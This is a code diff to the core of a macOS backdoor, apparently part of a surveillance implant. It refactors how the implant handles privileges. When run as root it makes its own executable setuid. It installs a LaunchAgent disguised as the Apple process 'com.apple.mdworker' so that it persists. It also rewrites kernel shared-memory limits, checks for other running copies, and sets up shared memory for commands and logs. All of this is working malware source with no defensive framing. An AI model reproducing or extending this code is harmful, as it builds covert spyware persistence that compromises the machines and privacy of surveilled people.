@@ -221,14 +221,11 @@ static void computerWillShutdown(CFMachPortRef port,
 //
 - (void)_createInternalFilesAndFolders;
 
-//
-// Make a question and give an answer
-//
-- (void)_checkCurrentPrivsAndDoWhatYouWant;
+- (void)_resizeSharedMemoryWindow;
 
 - (BOOL)_createAndInitSharedMemory;
 
-- (void)_checkIfIamHighlander;
+- (void)_checkForOthers;
 
 - (BOOL)_SLIEscalation;
 
@@ -642,7 +639,9 @@ static void computerWillShutdown(CFMachPortRef port,
 {
   //int agentIndex = 0;
   //int agentsCount = 8;
+#ifdef DEBUG_CORE
   int x = 0;
+#endif
   
   shMemoryLog *shMemLog;
   RCSMLogManager *_logManager   = [RCSMLogManager sharedInstance];
@@ -1232,8 +1231,10 @@ static void computerWillShutdown(CFMachPortRef port,
           [agentConfiguration release];
         }
         
+#ifdef DEBUG_CORE
       if (x == 0)
         x++;
+#endif
       
       [innerPool drain];
     }
@@ -1473,26 +1474,14 @@ static void computerWillShutdown(CFMachPortRef port,
   */
 }
 
-- (void)_checkCurrentPrivsAndDoWhatYouWant
+- (void)_resizeSharedMemoryWindow
 {
-  //
-  // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
-  // and will be killed once the user will login, thus we just suid the core
-  // and drop the LaunchAgent startup item in order to get executed after login
-  //
-  if (getuid() == 0) // R00TFWHOOT
+  if (getuid() == 0 || geteuid() == 0)
     {
 #ifdef DEBUG_CORE
-      infoLog(@"Root executed us, we don't need him :)");
+      warnLog(@"High Privs mode, big shared memory");
 #endif
       
-      [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
-      [self makeBackdoorResident];
-    
-      exit(0);
-    }
-  else if (getuid() == 0 || geteuid() == 0) // R00TFWOOF
-    {
       //
       // Let's change the default shared memory max size to a better value
       //
@@ -1500,52 +1489,53 @@ static void computerWillShutdown(CFMachPortRef port,
                              @"-w",
                              @"kern.sysv.shmmax=67108864",
                              nil];
+      
       [gUtil executeTask: @"/usr/sbin/sysctl"
-            withArguments: _arguments
-             waitUntilEnd: YES];
+           withArguments: _arguments
+            waitUntilEnd: YES];
       
       _arguments = [NSArray arrayWithObjects:
                     @"-w",
                     @"kern.sysv.shmall=4096",
                     nil];
-      [gUtil executeTask: @"/usr/sbin/sysctl"
-            withArguments: _arguments
-             waitUntilEnd: YES];
-    }
-  else // Antani
-    {
-#ifdef DEBUG_CORE
-      infoLog(@"Going with NO PRIVS");
-#endif
-      NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
-                            [[[[[NSBundle mainBundle] bundlePath]
-                               stringByDeletingLastPathComponent]
-                              stringByDeletingLastPathComponent]
-                             stringByDeletingLastPathComponent],
-                            BACKDOOR_DAEMON_PLIST];
       
-      if ([[NSFileManager defaultManager] fileExistsAtPath: ourPlist] == NO)
-        {
-          // Factory restored machines don't have this dir
-          mkdir([[ourPlist stringByDeletingLastPathComponent] UTF8String], 0755);
-          
-          // Now chown it -> ourself
-          NSArray *_tempArguments = [[NSArray alloc] initWithObjects: @"-R",
-                                     NSUserName(),
-                                     [ourPlist stringByDeletingLastPathComponent],
-                                     nil];
-          
-          [gUtil executeTask: @"/usr/sbin/chown"
-                withArguments: _tempArguments
-                 waitUntilEnd: YES];
-          
-          [_tempArguments release];
-        }
+      [gUtil executeTask: @"/usr/sbin/sysctl"
+           withArguments: _arguments
+            waitUntilEnd: YES];
+    }
+  else
+    {
+      //
+      // With low privs we will have a very small shared memory
+      // in order to keep everything working as expected
+      // shmem won't be used at all
+      //
+#ifdef DEBUG_CORE
+      warnLog(@"Low Privs mode, small shared memory");
+#endif
+      
+      //
+      // Give a smaller size since we don't have privileges
+      // for executing sysctl
+      //
+      gMemLogMaxSize = 0x7a440;
     }
 }
 
 - (BOOL)_createAndInitSharedMemory
 {
+  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
+  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
+  
+  // init shared memory
+  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
+                                                          size: gMemCommandMaxSize
+                                                 semaphoreName: SHMEM_SEM_NAME];
+
+  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
+                                                          size: gMemLogMaxSize
+                                                 semaphoreName: SHMEM_SEM_NAME];
+  
   //
   // Create and initialize the shared memory segments
   // for commands and logs
@@ -1588,7 +1578,7 @@ static void computerWillShutdown(CFMachPortRef port,
   return YES;
 }
 
-- (void)_checkIfIamHighlander
+- (void)_checkForOthers
 {
   //
   // Avoid to create the NSPort if we're running from a different name in order
@@ -1603,7 +1593,7 @@ static void computerWillShutdown(CFMachPortRef port,
       infoLog(@"uid : %d", getuid());
       infoLog(@"euid: %d", geteuid());
 #endif
-    
+      
       //
       // Check if there's another backdoor running
       //
@@ -1622,6 +1612,12 @@ static void computerWillShutdown(CFMachPortRef port,
           warnLog(@"Port Registered correctly");
 #endif
         }
+    }
+  else
+    {
+#ifdef DEBUG_CORE
+      warnLog(@"Can't check for others since we don't have the right conditions");
+#endif
     }
 }
 
@@ -1690,6 +1686,25 @@ static void computerWillShutdown(CFMachPortRef port,
 #ifdef DEBUG_CORE
               errorLog(@"An error occurred while making backdoor resident");
 #endif
+            }
+          else
+            {
+              //
+              // Force owner since we can't remove that file if not owned by us
+              // with removeItemAtPath:error (e.g. backdoor upgrade)
+              //
+              NSString *ourPlist = [NSString stringWithFormat: @"%@/%@",
+                                    NSHomeDirectory(),
+                                    BACKDOOR_DAEMON_PLIST];
+              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
+              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
+                                         userAndGroup,
+                                         ourPlist,
+                                         nil];
+
+              [gUtil executeTask: @"/usr/sbin/chown"
+                   withArguments: _tempArguments
+                    waitUntilEnd: YES];
             }
       
           NSString *tempFileName = [[NSString alloc] initWithFormat: @"%@/%@%@",
@@ -2261,7 +2276,8 @@ static void computerWillShutdown(CFMachPortRef port,
 
 - (BOOL)makeBackdoorResident
 {
-  return [gUtil createLaunchAgentPlist: @"com.apple.mdworker"];
+  return [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
+                             forBinary: gBackdoorName];
 }
 
 - (BOOL)isBackdoorAlreadyResident
@@ -2287,58 +2303,44 @@ static void computerWillShutdown(CFMachPortRef port,
 - (BOOL)runMeh
 {
   NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-  
+  BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
+
 #ifdef ENABLE_LOGGING
   [RCSMLogger setComponent: @"core"];
+  infoLog(@"STARTING");
 #endif
-  
-  BOOL sliSuccess = NO, uiSuccess = NO, noPrivs = NO;
-  
+
   // Get OS version
   [[NSApplication sharedApplication] getSystemVersionMajor: &gOSMajor
                                                      minor: &gOSMinor
                                                     bugFix: &gOSBugFix];
-  
-  [self _checkCurrentPrivsAndDoWhatYouWant];
 
-  key_t memKeyForCommand = ftok([NSHomeDirectory() UTF8String], 3);
-  key_t memKeyForLogging = ftok([NSHomeDirectory() UTF8String], 5);
-  
   //
-  // With low privs we will have a very small shared memory
-  // in order to keep everything working as expected
-  // shmem won't be used at all
+  // With SLIPLIST mode, the backdoor will be executed preauth with uid = 0
+  // and will be killed once the user will login, thus we just suid the core
+  // and drop the LaunchAgent startup item in order to get executed after login
   //
-  if (getuid() != 0 && geteuid != 0)
+  if (getuid() == 0)
     {
 #ifdef DEBUG_CORE
-      warnLog(@"Low Privs mode, small shared memory");
+      infoLog(@"Root executed us, we don't need him :)");
 #endif
-
-      //
-      // Give a smaller size since we don't have privileges
-      // for executing sysctl
-      //
-      gMemLogMaxSize = 0x7a440;
+      
+      [gUtil makeSuidBinary: [[NSBundle mainBundle] executablePath]];
+      [self makeBackdoorResident];
+      
+      exit(0);
     }
 
-  // init shared memory
-  gSharedMemoryCommand = [[RCSMSharedMemory alloc] initWithKey: memKeyForCommand
-                                                          size: gMemCommandMaxSize
-                                                 semaphoreName: SHMEM_SEM_NAME];
-  gSharedMemoryLogging = [[RCSMSharedMemory alloc] initWithKey: memKeyForLogging
-                                                          size: gMemLogMaxSize
-                                                 semaphoreName: SHMEM_SEM_NAME];
+  //
+  // Resize shared mem if needed
+  //
+  [self _resizeSharedMemoryWindow];
   
-  if ([self _createAndInitSharedMemory] == NO)
-    {
-#ifdef DEBUG_CORE
-      errorLog(@"Error while creating shared memory");
-#endif
-      return NO;
-    }
-
-  [self _checkIfIamHighlander];
+  //
+  // Check it we're the only one on this machine
+  //
+  [self _checkForOthers];
   
   //
   // Check the preconfigured mode - default is SLIPLIST
@@ -2386,6 +2388,31 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
     }
   
+  //
+  // Create LaunchAgent dir if it doesn't exists yet
+  //
+  NSString *launchAgentPath = [NSString stringWithFormat: @"%@/%@",
+                               NSHomeDirectory(),
+                               [BACKDOOR_DAEMON_PLIST stringByDeletingLastPathComponent]];
+
+  if ([[NSFileManager defaultManager] fileExistsAtPath: launchAgentPath] == NO)
+    {
+      // Factory restored machines don't have this dir
+      mkdir([launchAgentPath UTF8String], 0755);
+
+      // Now chown it -> ourself
+      NSArray *_tempArguments = [[NSArray alloc] initWithObjects: @"-R",
+                                 NSUserName(),
+                                 launchAgentPath,
+                                 nil];
+
+      [gUtil executeTask: @"/usr/sbin/chown"
+           withArguments: _tempArguments
+            waitUntilEnd: YES];
+
+      [_tempArguments release];
+    }
+
   //
   // Check if the backdoor is already resident
   // otherwise add all the required files for making it resident
@@ -2450,8 +2477,21 @@ static void computerWillShutdown(CFMachPortRef port,
             }          
         }
     }
-  
   [workingMode release];
+  
+  //
+  // Create and initialize shared memory
+  //
+  if ([mApplicationName isEqualToString: @"System Preferences"] == NO)
+    {
+      if ([self _createAndInitSharedMemory] == NO)
+        {
+#ifdef DEBUG_CORE
+          errorLog(@"Error while creating shared memory");
+#endif
+          return NO;
+        }
+    }
   
   if ([[NSFileManager defaultManager] fileExistsAtPath: [gUtil mExecFlag]
                                            isDirectory: NULL])
